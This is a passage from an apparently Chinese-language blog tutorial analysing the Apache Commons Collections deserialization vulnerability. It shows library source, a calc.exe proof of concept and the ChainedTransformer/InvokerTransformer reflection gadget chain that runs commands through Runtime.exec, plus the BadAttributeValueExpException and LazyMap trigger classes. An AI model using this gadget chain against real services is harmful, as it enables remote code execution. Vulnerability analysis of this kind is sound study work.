class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (methodName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"The method to invoke must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InvokerTransformer(methodName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (methodName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"The method to invoke must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramTypes == <span class="keyword">null</span> &amp;&amp; args != <span class="keyword">null</span> || paramTypes != <span class="keyword">null</span> &amp;&amp; args == <span class="keyword">null</span> || paramTypes != <span class="keyword">null</span> &amp;&amp; args != <span class="keyword">null</span> &amp;&amp; paramTypes.length != args.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"The parameter types must match the arguments"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paramTypes != <span class="keyword">null</span> &amp;&amp; paramTypes.length != <span class="number">0</span>) &#123;</span><br><span class="line">            paramTypes = (Class[])((Class[])paramTypes.clone());</span><br><span class="line">            args = (Object[])((Object[])args.clone());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InvokerTransformer(methodName, paramTypes, args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InvokerTransformer(methodName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到该InvokerTransformer类是实现Transformer接口的（Transformer接口主要用于转换并返回一个给定的Object对象），且其中的transform()方法采用反射机制进行任意函数调用，这就是漏洞点所在。</p><p>这里是反射机制关键的三句代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass();</span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>第一句：input为Object对象，获取其对应的Class；</p><p>第二句：获取cls类中具体的方法对象；</p><p>第三句：执行input对象的method方法，返回同method一样的返回类型。</p><p>上述三句代码其实等同于下面的代码，即可以直接合并起来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input.getClass().getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes).invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>下面编写代码进行弹出计算器的测试来验证该漏洞点是否能利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC_Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer it = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>&#125;);</span><br><span class="line">        it.transform(java.lang.Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/02/06/Java反序列化漏洞/4.png" alt="demo"></p><p>可以看到是可以弹出计算器的，即可以进行漏洞利用，但是有个问题，就是我们不能从外部直接传入java.lang.Runtime.getRuntime()，这时就需要我们去构造链式结构的payload来实现漏洞利用。</p><p>下面就开始构造反射链payload来实现反序列化漏洞的利用。</p><h3 id="1、通过反射构造可序列化的恶意反射链对象"><a href="#1、通过反射构造可序列化的恶意反射链对象" class="headerlink" title="1、通过反射构造可序列化的恶意反射链对象"></a>1、通过反射构造可序列化的恶意反射链对象</h3><p>一步步来，我们知道，要让Java程序执行执行命令，通常是获取到<code>Runtime</code>的实例，再调用它的<code>exec()</code>执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">runtime.exec(cmd);</span><br></pre></td></tr></table></figure><p>接着将其表示为链式结构的形式，因为底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure><p>好了，我们知道构造的反射链是这种格式，下面开始分析Commons Collections的payload的链式结构。</p><p>Commons Collections中有一个用于对象之间转换的Transformer接口，先看构造的链式结构payload中涉及到的几个实现类，只需看其构造方法和transform()方法即可。</p><p>1、ConstantTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，可看到transform()方法会原封不动地返回传入的Object，从而可构造外部输入的常量如Runtime.class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、InvokerTransformer类，在漏洞点中已说明。</p><p>3、ChainedTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，其transform()方法用于链接多个步骤构造的transformer，其中object参数为上一次调用transform()的返回结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着看下面这段构造的payload链式结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>,&#125;),</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure><p>构造过程如下：</p><ol><li>构造一个ConstantTransformer对象，把Runtime的Class对象传进去，在transform()时，始终会返回这个对象；</li><li>构造一个InvokerTransformer对象，待调用方法名为getMethod，参数为getRuntime，在transform()时，传入第一步的结果，此时的input应该是java.lang.Runtime，但经过getClass()之后，cls为java.lang.Class，之后getMethod()只能获取java.lang.Class的方法，因此才会定义的待调用方法名为getMethod，然后其参数才是getRuntime，它得到的是getMethod这个方法的Method对象，invoke()调用这个方法，最终得到的才是getRuntime这个方法的Method对象；</li><li>构造一个InvokerTransformer对象，待调用方法名为invoke，参数为空，在transform()时，传入第二步的结果，同理，cls将会是java.lang.reflect.Method，再获取并调用它的invoke()方法，实际上是调用上面的getRuntime()拿到Runtime对象；</li><li>构造一个InvokerTransformer对象，待调用方法名为exec，参数为命令字符串，在transform()时，传入第三步的结果，获取java.lang.Runtime的exec方法并传参调用；</li><li>最后把它们组装成一个数组全部放进ChainedTransformer中，在transform()时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求。</li></ol><p>有一个问题——上面的第2、3步是不是可以简化一下，考虑用下面这种逻辑更清晰的方式来构造呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure><p>答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于Runtime.getRuntime()得到的是一个对象，这个对象也需要参与序列化过程，而Runtime本身是没有实现Serializable接口的，所以会导致序列化失败。</p><p>构造完这条Transformer链，就等着谁来执行它的transform()了。</p><p>这里可以先直接在代码下面添加<code>transformerChain.transform(null);</code>语句来查看该Transformer链是否真的可以执行命令且该对象是否可以被序列化，代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>,&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试我们的恶意对象是否可以被序列化</span></span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行以下语句就可以调用起计算器</span></span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行之后程序没报错，即该Transformer链可以进行序列化，并且在执行<code>transformerChain.transform(null);</code>时成功弹出计算器：</p><p><img src="/2019/02/06/Java反序列化漏洞/2.png" alt="payload1"></p><p>该Transformer链没有问题，下面就是找Commons Collections中哪些地方可以执行该Transformer链的transform()方法以及寻找含有自定义有漏洞的readObject()方法的类了。</p><h3 id="2、查找自定义readObject-方法且存在漏洞代码的类"><a href="#2、查找自定义readObject-方法且存在漏洞代码的类" class="headerlink" title="2、查找自定义readObject()方法且存在漏洞代码的类"></a>2、查找自定义readObject()方法且存在漏洞代码的类</h3><p>如网上所说，在JDK较早的版本中存在AnnotationInvocationHandler类 ，其类对象在初始化时可以传入一个Map类型参数赋值给字段memberValues，readObject()过程中如果满足一定条件就会对memberValues中的元素进行setValue()。</p><p>但是，在较新版本的JDK中AnnotationInvocationHandler没有了setValue()方法，但是可以使用BadAttributeValueExpException类来实现。由于本地环境的JDK为较新的版本，因此就只暂时对BadAttributeValueExpException类进行分析。</p><p><strong>BadAttributeValueExpException</strong></p><p>下面看下BadAttributeValueExpException类定义，可以看到定义了一个名为val的对象类型属性，且自定义了readObject()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title">Exception</span>   </span>&#123;</span><br><span class="line">    <span class="comment">/* Serial version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3105272988410493376L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serial</span> A string representation of the attribute that originated this exception.</span></span><br><span class="line"><span class="comment">     * for example, the string value can be the return of &#123;<span class="doctag">@code</span> attribute.toString()&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Object val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a BadAttributeValueExpException using the specified Object to</span></span><br><span class="line"><span class="comment">     * create the toString() value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> val the inappropriate value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val = val == <span class="keyword">null</span> ? <span class="keyword">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the string representing the object.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"BadAttributeValueException: "</span> + val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            val = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>查看自定义的readObejct()方法，其中在满足System.getSecurityManager() == null时会调用 valObj.toString()，从攻击思路上看，其他的条件都是无法满足的。因此valObj.toString()就成为了突破口，此时要找到一个合适的工具在toString()方法被调用的时候会触发我们构造的恶意代码。</p><h3 id="3、查找可通过toString-触发transform-方法的合适的类"><a href="#3、查找可通过toString-触发transform-方法的合适的类" class="headerlink" title="3、查找可通过toString()触发transform()方法的合适的类"></a>3、查找可通过toString()触发transform()方法的合适的类</h3><p>从BadAttributeValueExpException类的readObejct()方法知道，关注点在valObj.toString()中，那么现在就需要找到一个合适的类在调用toString()方法时触发transform()方法来执行我们构造的反射链。</p><p><strong>LazyMap——调用get()方法触发transform()方法</strong></p><p>LazyMap是Commons-collections 3.1提供的一个工具类，是Map的一个实现，主要的内容是利用工厂设计模式，在用户get一个不存在的key的时候执行一个方法来生成Key值，当且仅当get行为存在的时候Value才会被生成。其定义代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="keyword">this</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span 